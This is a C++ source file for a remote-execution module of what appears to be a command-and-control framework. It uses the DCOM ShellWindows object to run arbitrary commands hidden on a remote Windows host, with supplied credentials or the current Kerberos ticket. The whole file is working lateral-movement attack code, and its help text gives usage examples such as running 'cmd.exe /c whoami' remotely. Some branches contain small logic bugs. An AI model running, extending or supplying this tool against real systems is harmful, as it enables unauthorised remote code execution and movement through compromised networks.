#include "DcomExec.hpp"

#include "Common.hpp"

#include <sstream>

#ifdef _WIN32
#include <windows.h>
#include <atlbase.h>
#include <comdef.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
using ATL::CComPtr;
#endif

using namespace std;

constexpr std::string_view moduleNameDcom = "dcomExec";
constexpr unsigned long long moduleHashDcom = djb2(moduleNameDcom);

#ifdef _WIN32
extern "C" __declspec(dllexport) DcomExec* DcomExecConstructor()
{
    return new DcomExec();
}
#else
extern "C" __attribute__((visibility("default"))) DcomExec* DcomExecConstructor()
{
    return new DcomExec();
}
#endif

DcomExec::DcomExec()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleNameDcom), moduleHashDcom)
#else
    : ModuleCmd("", moduleHashDcom)
#endif
{
}

DcomExec::~DcomExec() = default;


// DCOM/RPC connectivity (TCP 135 + dynamic RPC high ports)
std::string DcomExec::getInfo()
{
    std::ostringstream oss;
#ifdef BUILD_TEAMSERVER
    oss << "DCOM Execution Module:\n";
    oss << "Trigger remote COM objects to execute commands using ShellWindows {9BA05972-F6A8-11CF-A442-00A0C90A8F39}." << '\n';
    oss << "Options:" << '\n';
    oss << "  -h <host>           Remote hostname or IP." << '\n';
    oss << "  -c <command>        Command to execute." << '\n';
    oss << "  -a <arguments>      Arguments for the command." << '\n';
    oss << "  -w <working dir>    Working directory." << '\n';
    oss << "  -k <spn>            SPN to request for Kerberos (e.g. HOST/fqdn)." << '\n';
    oss << "  -u <username>       Username for explicit credentials." << '\n';
    oss << "  -p <password>       Password for explicit credentials." << '\n';
    oss << "  -n                  No cred, for local use." << '\n';
    oss << "Example:" << '\n';
    oss << "  dcomExec -h fileserver -k HOST/fileserver.domain -u DOMAIN\\\\user -p Passw0rd -c cmd.exe -a \"/c whoami\"" << '\n';
    oss << "  dcomExec -h fileserver -c cmd.exe -a \"/c whoami\"\n";
#endif
    return oss.str();
}


// packParameters() — append new fields (spn, username, password, noPassword flag)
std::string DcomExec::packParameters(const Parameters& params) const
{
    std::string packed;
    auto append = [&packed](const std::string& value)
    {
        packed.append(value);
        packed.push_back('\0');
    };

    append(params.hostname);
    append(params.progId);
    append(params.command);
    append(params.arguments);
    append(params.workingDir);

    // new fields
    append(params.spn);
    append(params.username);
    append(params.password);

    // store noPassword as "1" or "0"
    append(params.noPassword ? "1" : "0");

    return packed;
}


// unpackParameters() — read back the added fields
DcomExec::Parameters DcomExec::unpackParameters(const std::string& data) const
{
    Parameters params;
    std::vector<std::string> parts;
    size_t start = 0;
    while (start < data.size())
    {
        size_t end = data.find('\0', start);
        if (end == std::string::npos)
        {
            break;
        }
        parts.emplace_back(data.substr(start, end - start));
        start = end + 1;
    }

    // we now expect at least 9 parts:
    // hostname, progId, command, arguments, workingDir, spn, username, password, noPassword
    if (parts.size() < 9)
    {
        return params;
    }

    params.hostname = parts[0];
    params.progId = parts[1];
    params.command = parts[2];
    params.arguments = parts[3];
    params.workingDir = parts[4];

    // new fields
    params.spn = parts[5];
    params.username = parts[6];
    params.password = parts[7];
    params.noPassword = (parts[8] == "1");

    return params;
}


int DcomExec::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
    std::vector<std::string> args = regroupStrings(splitedCmd);
    Parameters params;

    if (args.size() < 2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    params.noPassword=false;

    for (size_t i = 1; i < args.size(); ++i)
    {
        const std::string& current = args[i];
        if (current == "-h" && i + 1 < args.size())
        {
            params.hostname = args[++i];
        }
        else if (current == "-c" && i + 1 < args.size())
        {
            params.command = args[++i];
        }
        else if (current == "-a" && i + 1 < args.size())
        {
            params.arguments = args[++i];
        }
        else if (current == "-w" && i + 1 < args.size())
        {
            params.workingDir = args[++i];
        }
        else if (current == "-k" && i + 1 < args.size())
        {
            params.spn = args[++i];
        }
        else if (current == "-u" && i + 1 < args.size())
        {
            params.username = args[++i];
        }
        else if (current == "-p" && i + 1 < args.size())
        {
            params.password = args[++i];
        }
        else if (current == "-n")
        {
            // no cred use
            params.noPassword = true;
        }
        // fallback: positional args (hostname, command, arguments)
        else if (!current.empty() && current[0] != '-')
        {
            if (params.hostname.empty())
            {
                params.hostname = current;
            }
            else if (params.command.empty())
            {
                params.command = current;
            }
            else if (params.arguments.empty())
            {
                params.arguments = current;
            }
        }
    }

    // Basic validation
    if (params.hostname.empty() || params.command.empty())
    {
        c2Message.set_returnvalue("Missing hostname or command.\n" + getInfo());
        return -1;
    }

    // Credential validation rules:
    // - If username provided:
    //     - If noPassword == false and password empty => error (we expect -p)
    //     - If noPassword == true => ok (we will not send password; client likely wants to use ticket or blank password)
    // - If password provided without username => error
    if (!params.username.empty())
    {
        if (!params.noPassword && params.password.empty())
        {
            c2Message.set_returnvalue("Username provided but no password (-p) and -n not set.\n" + getInfo());
            return -1;
        }
    }
    else
    {
        // username empty
        if (!params.password.empty())
        {
            c2Message.set_returnvalue("Password supplied (-p) but no username (-u).\n" + getInfo());
            return -1;
        }
    }

    // store instruction + packed params
    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(packParameters(params));
#endif
    return 0;
}


int DcomExec::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string cmd = c2Message.cmd();
    c2RetMessage.set_instruction(c2RetMessage.instruction()); 
    c2RetMessage.set_cmd(cmd); 
    
    Parameters params = unpackParameters(c2Message.cmd());
    std::string result;
    bool error = 0;

#ifdef _WIN32
    error = executeRemote(params, result);
#else
    result = "Oly supported on Windows.\n";
#endif

    if(error)
        c2RetMessage.set_errorCode(error);

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);
    return 0;
}


#define ERROR_SUCCESS                   0
#define ERROR_COINIT_FAILED             1
#define ERROR_CLSIDFROMSTRING_FAILED    2
#define ERROR_COCREATEINSTANCE_FAILED   3
#define ERROR_GETIDS_ITEM_FAILED        4
#define ERROR_INVOKE_ITEM_FAILED        5
#define ERROR_GETIDS_DOCUMENT_FAILED    6
#define ERROR_INVOKE_DOCUMENT_FAILED    7
#define ERROR_GETIDS_APPLICATION_FAILED 8
#define ERROR_INVOKE_APPLICATION_FAILED 9
#define ERROR_GETIDS_SHELLEXECUTE_FAILED 10
#define ERROR_INVOKE_SHELLEXECUTE_FAILED 11


int DcomExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        errorMsg = c2RetMessage.returnvalue();
    }
#endif
    return 0;
}


#ifdef _WIN32
namespace
{
    std::wstring toWide(const std::string& value)
    {
        if (value.empty())
        {
            return std::wstring();
        }
        int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0);
        std::wstring wide(sizeNeeded, L'\0');
        MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), wide.data(), sizeNeeded);
        return wide;
    }

    std::string formatHResult(HRESULT hr)
    {
        _com_error err(hr);
        std::ostringstream oss;
        oss << "0x" << std::hex << std::uppercase << hr << ": " << err.ErrorMessage();
        return oss.str();
    }

    static COAUTHIDENTITY* MakeAuthIdentityW(const std::wstring& user, const std::wstring& domain, const std::wstring& pass)
    {
        COAUTHIDENTITY* p = (COAUTHIDENTITY*)CoTaskMemAlloc(sizeof(COAUTHIDENTITY));
        if (!p) return nullptr;
        ZeroMemory(p, sizeof(*p));
        // NOTE: CoTaskMemAlloc used so it can be freed with CoTaskMemFree
        p->User = (USHORT*)CoTaskMemAlloc((user.size()+1) * sizeof(wchar_t));
        p->Domain = (USHORT*)CoTaskMemAlloc((domain.size()+1) * sizeof(wchar_t));
        p->Password = (USHORT*)CoTaskMemAlloc((pass.size()+1) * sizeof(wchar_t));
        if (!p->User || !p->Domain || !p->Password) {
            if (p->User) CoTaskMemFree(p->User);
            if (p->Domain) CoTaskMemFree(p->Domain);
            if (p->Password) CoTaskMemFree(p->Password);
            CoTaskMemFree(p);
            return nullptr;
        }
        wcscpy_s((wchar_t*)p->User, user.size()+1, user.c_str());
        wcscpy_s((wchar_t*)p->Domain, domain.size()+1, domain.c_str());
        wcscpy_s((wchar_t*)p->Password, pass.size()+1, pass.c_str());
        p->UserLength = (ULONG)user.size();
        p->DomainLength = (ULONG)domain.size();
        p->PasswordLength = (ULONG)pass.size();
        p->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
        return p;
    }

    void FreeAuthIdentity(COAUTHIDENTITY* p)
    {
        if (!p) return;
        if (p->User) CoTaskMemFree(p->User);
        if (p->Domain) CoTaskMemFree(p->Domain);
        if (p->Password) CoTaskMemFree(p->Password);
        CoTaskMemFree(p);
    }
}


// +-------------------------------------------------------------+
// | CLSID_ShellWindows ({9BA05972-F6A8-11CF-A442-00A0C90A8F39}) |
// |  → IDispatch interface (returned by CoCreateInstanceEx)     |
// +-------------------------------------------------------------+
//                  │
//                  ▼
//          .Item(index = 0)
//                  │
//                  ▼
// +----------------+----------------+
// |  IDispatch for Shell Window     |
// |  (represents a single Explorer  |
// |   or IE window instance)        |
// +---------------------------------+
//                  │
//                  ▼
//         .Document property
//                  │
//                  ▼
// +----------------+----------------+
// |  IDispatch for Document object  |
// |  (represents the loaded content |
// |   or folder view)               |
// +---------------------------------+
//                  │
//                  ▼
//        .Application property
//                  │
//                  ▼
// +----------------+----------------+
// |  IDispatch for Application      |
// |  (represents the top-level      |
// |   shell application instance,   |
// |   exposes Shell automation API) |
// +---------------------------------+
//                  │
//                  ▼
//        .ShellExecute(file, args, dir, op, show)
//                  │
//                  ▼
//     Executes the remote command on the target

// https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
// TODO https://github.com/xforcered/ForsHops/blob/main/ForsHops.cpp ?
int DcomExec::executeRemote(const Parameters& params, std::string& result) const
{
    DWORD authnSvc = RPC_C_AUTHN_NONE;          // RPC_C_AUTHN_GSS_KERBEROS or RPC_C_AUTHN_WINNT
    bool useToken = false;                      // use current process token / Kerberos ticket
    bool useNTLM = false;                       // use explicit username/password (NTLM or Kerberos based on authnSvc)
    std::wstring spn;                           // SPN to use (may be empty)
    std::wstring domainW;
    std::wstring userW;
    std::wstring passW;

    bool usernameProvided = !params.username.empty();
    bool passwordProvided = !params.password.empty();
    bool noPassword = params.noPassword; // -n
    
    std::cout << "noPassword " << noPassword << std::endl;

    spn = std::wstring(params.spn.begin(), params.spn.end()); // copy SPN to wide string for CoSetProxyBlanket later

    // Case 1: explicit username + password -> use explicit creds (NTLM)
    if (usernameProvided && passwordProvided)
    {
        useNTLM = true;
        useToken = false;
        authnSvc = RPC_C_AUTHN_WINNT; // explicit credential path (NTLM) — SSPI may pick Kerberos if appropriate, but WinNT forces NTLM
        // split username into domain\user if user passed with backslash?
        domainW = L"";
        userW = std::wstring(params.username.begin(), params.username.end());

        // If user provided as "DOMAIN\\user", split
        size_t pos = userW.find(L'\\');
        if (pos != std::wstring::npos) 
        {
            domainW = userW.substr(0, pos);
            userW = userW.substr(pos + 1);
        } 
        else 
        {
            // fallback domain provided by params? You might have a separate domain parameter; assume local machine if not set.
            domainW = L"";
        }

        passW = std::wstring(params.password.begin(), params.password.end());
    }

    // Case 2: username provided but no password (and -n set) -> treat as "use token instead of sending password"
    if (usernameProvided && !passwordProvided)
    {
        // user asked not to send a password. We'll rely on current credentials (Kerberos) and optionally supply the username to server
        // Implementation choice: we do not send pAuthIdentity, we let current token/SSPI handle auth. Still copy SPN if given.
        useToken = true;
        useNTLM = false;
        authnSvc = RPC_C_AUTHN_GSS_KERBEROS; // prefer Kerberos

    }

    // Case 3: no cred provided
    if (noPassword)
    {
        useToken = false;
        useNTLM = false;
    }


    HRESULT hr;
    bool needUninit = false;
    result.clear();

    // Initialize COM
    hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr))
    {
        needUninit = true;
    }
    else if (hr != RPC_E_CHANGED_MODE)
    {
        result = formatHResult(hr);
        return ERROR_COINIT_FAILED;
    }

    // Optional (recommended): set process-wide defaults before doing remote calls
    // Note: call this once (and before CoCreateInstanceEx ideally)
    CoInitializeSecurity(
        nullptr,                        // pSecDesc
        -1,                             // cAuthSvc
        nullptr,                        // asAuthSvc
        nullptr,                        // pReserved1
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  // RPC_C_AUTHN_LEVEL
        RPC_C_IMP_LEVEL_IMPERSONATE,    // RPC_C_IMP_LEVEL
        nullptr,                        // pAuthList (use default)
        EOAC_NONE,                      // dwCapabilities           , shoult it be EOAC_MUTUAL_AUTH | EOAC_SECURE_REFS for kerberos ??
        nullptr                         // pReserved3
    );

    // Convert CLSID
    CLSID clsid;
    // CLSID_ShellWindows
    std::wstring clsidStr = L"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}";
    hr = CLSIDFromString((LPOLESTR)clsidStr.c_str(), &clsid);
    if (FAILED(hr))
    {
        result = formatHResult(hr);
        if (needUninit) CoUninitialize();
        return ERROR_CLSIDFROMSTRING_FAILED;
    }

    // Server info
    std::wstring hostnameWide = toWide(params.hostname);
    COSERVERINFO serverInfo = {};
    serverInfo.pwszName = hostnameWide.empty() ? nullptr : const_cast<LPWSTR>(hostnameWide.c_str());

    MULTI_QI mqi = {};
    mqi.pIID = &IID_IDispatch;
    mqi.pItf = nullptr;
    mqi.hr = 0;

    // Create remote COM object
    hr = CoCreateInstanceEx(clsid, nullptr, CLSCTX_REMOTE_SERVER | CLSCTX_LOCAL_SERVER,
                            serverInfo.pwszName ? &serverInfo : nullptr, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr))
    {
        result = formatHResult(FAILED(hr) ? hr : mqi.hr);
        if (needUninit) CoUninitialize();
        return ERROR_COCREATEINSTANCE_FAILED;
    }

    CComPtr<IDispatch> dispatch;
    dispatch.Attach(static_cast<IDispatch*>(mqi.pItf));

    if(useNTLM)
    {
        // Prepare COAUTHIDENTITY and COAUTHINFO (Unicode preferred)
        COAUTHIDENTITY* pAuthId = MakeAuthIdentityW(userW, domainW, passW);
        COAUTHINFO authInfo = {};
        authInfo.dwAuthnSvc = authnSvc; // or RPC_C_AUTHN_GSS_KERBEROS if needed
        authInfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
        authInfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
        authInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
        authInfo.pAuthIdentityData = pAuthId;
        authInfo.dwCapabilities = EOAC_SECURE_REFS;


        // Set security on the proxy (so subsequent calls use desired level)
        hr = CoSetProxyBlanket(
            dispatch,                            // proxy
            RPC_C_AUTHN_WINNT,               // authn svc (NTLM)
            RPC_C_AUTHZ_NONE,                // authz svc
            nullptr,                         // server principal name (use default/search)
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,   // authn level
            RPC_C_IMP_LEVEL_IMPERSONATE,     // impersonation level
            pAuthId,                         // auth identity (or nullptr to use current token)
            EOAC_NONE                        // capabilities
        );

        if (FAILED(hr)) 
        {
            if (needUninit) CoUninitialize();
            FreeAuthIdentity(pAuthId);
            result = formatHResult(hr);
            return -1000;
        }

        FreeAuthIdentity(pAuthId);
    }
    else if(useToken)
    {
        // Choose authn service: explicit Kerberos or Negotiate (let SSPI choose)
        const DWORD authnSvc = authnSvc; // explicit Kerberos
        // const DWORD authnSvc = RPC_C_AUTHN_DEFAULT; // or Negotiate

        const DWORD authzSvc = RPC_C_AUTHZ_NONE;
        // Server principal name (SPN) - recommended to help SSPI pick the correct ticket.
        // Example SPNs: L"HOST/host.fqdn", L"HOST/shortname", L"HTTP/service.host", etc.
        LPCWSTR pszServerPrincName = spn.empty() ? nullptr : spn.c_str();

        // Authentication level and impersonation
        const DWORD authnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY; // strong
        bool needDelegation = 0;
        const DWORD impLevel = needDelegation ? RPC_C_IMP_LEVEL_DELEGATE : RPC_C_IMP_LEVEL_IMPERSONATE;

        // pAuthInfo == nullptr -> use current process/thread credentials (Kerberos TGT)
        // pAuthIdentity == nullptr since we want the current token / SSPI to supply creds
        HRESULT hr = CoSetProxyBlanket(
            dispatch,                   // proxy
            authnSvc,               // RPC_C_AUTHN_GSS_KERBEROS (Kerberos)
            authzSvc,               // RPC_C_AUTHZ_NONE
            const_cast<wchar_t*>(pszServerPrincName),     // server principal name (SPN) or nullptr
            authnLevel,             // authentication level
            impLevel,               // impersonation level (DELEGATE if needed)
            nullptr,                // pAuthInfo (NULL -> use current credentials)
            EOAC_MUTUAL_AUTH | EOAC_SECURE_REFS // capabilities; add EOAC_MUTUAL_AUTH to require mutual auth
        );

        return hr;
    }

    // Get "Item"
    DISPID dispid;
    OLECHAR* methodName = const_cast<OLECHAR*>(L"Item");
    hr = dispatch->GetIDsOfNames(IID_NULL, &methodName, 1, LOCALE_USER_DEFAULT, &dispid);
    if (FAILED(hr))
    {
        result = formatHResult(hr);
        if (needUninit) CoUninitialize();
        return ERROR_GETIDS_ITEM_FAILED;
    }

    int itemIndex = 0;
    VARIANT idx; VariantInit(&idx);
    idx.vt = VT_I4; idx.lVal = itemIndex;
    DISPPARAMS dpItem = { &idx, nullptr, 1, 0 };

    VARIANT vWindow; VariantInit(&vWindow);
    hr = dispatch->Invoke(dispid, IID_NULL, LOCALE_USER_DEFAULT,
                          DISPATCH_METHOD | DISPATCH_PROPERTYGET,
                          &dpItem, &vWindow, nullptr, nullptr);
    VariantClear(&idx);

    if (FAILED(hr))
    {
        result = formatHResult(hr);
        if (needUninit) CoUninitialize();
        return ERROR_INVOKE_ITEM_FAILED;
    }

    IDispatch* windowDisp = vWindow.pdispVal;

    // Get "Document"
    DISPID dispidDocument;
    OLECHAR* nameDocument = const_cast<OLECHAR*>(L"Document");
    hr = windowDisp->GetIDsOfNames(IID_NULL, &nameDocument, 1, LOCALE_USER_DEFAULT, &dispidDocument);
    if (FAILED(hr))
    {
        result = formatHResult(hr);
        windowDisp->Release();
        if (needUninit) CoUninitialize();
        return ERROR_GETIDS_DOCUMENT_FAILED;
    }

    VARIANT vDoc; VariantInit(&vDoc);
    DISPPARAMS dpNoArgs = { nullptr, nullptr, 0, 0 };
    hr = windowDisp->Invoke(dispidDocument, IID_NULL, LOCALE_USER_DEFAULT,
                            DISPATCH_PROPERTYGET, &dpNoArgs, &vDoc, nullptr, nullptr);
    windowDisp->Release();

    if (FAILED(hr))
    {
        result = formatHResult(hr);
        if (needUninit) CoUninitialize();
        return ERROR_INVOKE_DOCUMENT_FAILED;
    }

    IDispatch* docDisp = vDoc.pdispVal;

    // Get "Application"
    DISPID dispidApplication;
    OLECHAR* nameApplication = const_cast<OLECHAR*>(L"Application");
    hr = docDisp->GetIDsOfNames(IID_NULL, &nameApplication, 1, LOCALE_USER_DEFAULT, &dispidApplication);
    if (FAILED(hr))
    {
        result = formatHResult(hr);
        docDisp->Release();
        if (needUninit) CoUninitialize();
        return ERROR_GETIDS_APPLICATION_FAILED;
    }

    VARIANT vApp; VariantInit(&vApp);
    hr = docDisp->Invoke(dispidApplication, IID_NULL, LOCALE_USER_DEFAULT,
                         DISPATCH_PROPERTYGET, &dpNoArgs, &vApp, nullptr, nullptr);
    docDisp->Release();

    if (FAILED(hr))
    {
        result = formatHResult(hr);
        if (needUninit) CoUninitialize();
        return ERROR_INVOKE_APPLICATION_FAILED;
    }

    IDispatch* appDisp = vApp.pdispVal;

    // Get "ShellExecute"
    DISPID dispidShellExecute;
    OLECHAR* nameShellExecute = const_cast<OLECHAR*>(L"ShellExecute");
    hr = appDisp->GetIDsOfNames(IID_NULL, &nameShellExecute, 1, LOCALE_USER_DEFAULT, &dispidShellExecute);
    if (FAILED(hr))
    {
        result = formatHResult(hr);
        appDisp->Release();
        if (needUninit) CoUninitialize();
        return ERROR_GETIDS_SHELLEXECUTE_FAILED;
    }

    // Prepare ShellExecute args
    VARIANT args[5];
    for (int i = 0; i < 5; ++i) VariantInit(&args[i]);
    args[0].vt = VT_I4; args[0].lVal = SW_HIDE;
    args[1].vt = VT_BSTR; args[1].bstrVal = SysAllocString(L"open");
    args[2].vt = VT_BSTR; args[2].bstrVal = SysAllocString(toWide(params.workingDir).c_str());
    args[3].vt = VT_BSTR; args[3].bstrVal = SysAllocString(toWide(params.arguments).c_str());
    args[4].vt = VT_BSTR; args[4].bstrVal = SysAllocString(toWide(params.command).c_str());

    DISPPARAMS dp = { args, nullptr, 5, 0 };
    VARIANT vResult; VariantInit(&vResult);
    EXCEPINFO exInfo = {};
    UINT argErr = (UINT)-1;

    hr = appDisp->Invoke(dispidShellExecute, IID_NULL, LOCALE_USER_DEFAULT,
                         DISPATCH_METHOD, &dp, &vResult, &exInfo, &argErr);

    for (int i = 0; i < 5; ++i) VariantClear(&args[i]);
    VariantClear(&vResult);
    appDisp->Release();

    if (FAILED(hr))
    {
        result = formatHResult(hr);
        if (needUninit) CoUninitialize();
        return ERROR_INVOKE_SHELLEXECUTE_FAILED;
    }

    if (needUninit)
        CoUninitialize();

    result = "Success";
    return ERROR_SUCCESS;
}

#endif


//
// CLSID from progID
//

// CLSID clsid;
// std::wstring progIdWide = toWide(params.progId);
// hr = CLSIDFromProgID(progIdWide.c_str(), &clsid);
// if (FAILED(hr))
// {
//     if (needUninit)
//     {
//         CoUninitialize();
//     }
//     return "CLSIDFromProgID failed: " + formatHResult(hr) + "\n";
// }

//
// Enum
//

// CComPtr<ITypeInfo> pTypeInfo;
// hr = dispatch->GetTypeInfo(0, LOCALE_USER_DEFAULT, &pTypeInfo);
// if (SUCCEEDED(hr) && pTypeInfo) {
//     TYPEATTR* pAttr = nullptr;
//     hr = pTypeInfo->GetTypeAttr(&pAttr);
//     if (SUCCEEDED(hr) && pAttr) {
//         for (UINT i = 0; i < pAttr->cFuncs; ++i) {
//             FUNCDESC* pFuncDesc = nullptr;
//             if (SUCCEEDED(pTypeInfo->GetFuncDesc(i, &pFuncDesc))) {
//                 UINT cNames = 0;
//                 // first call GetNames to learn the name(s) for this memid
//                 BSTR* names = nullptr;
//                 // GetNames will allocate the BSTRs into caller supplied array.
//                 // We don't know how many names, but GetNames returns the count.
//                 // Here we allocate a safe array of size 16 for names:
//                 names = (BSTR*)CoTaskMemAlloc(sizeof(BSTR) * 16);
//                 if (names) {
//                     hr = pTypeInfo->GetNames(pFuncDesc->memid, names, 16, &cNames);
//                     if (SUCCEEDED(hr)) {
//                         for (UINT n = 0; n < cNames; ++n) {
//                             wprintf(L"Name: %s\n", names[n]);
//                             SysFreeString(names[n]);
//                         }
//                     }
//                     CoTaskMemFree(names);
//                 }
//                 pTypeInfo->ReleaseFuncDesc(pFuncDesc);
//             }
//         }
//         pTypeInfo->ReleaseTypeAttr(pAttr);
//     }
// }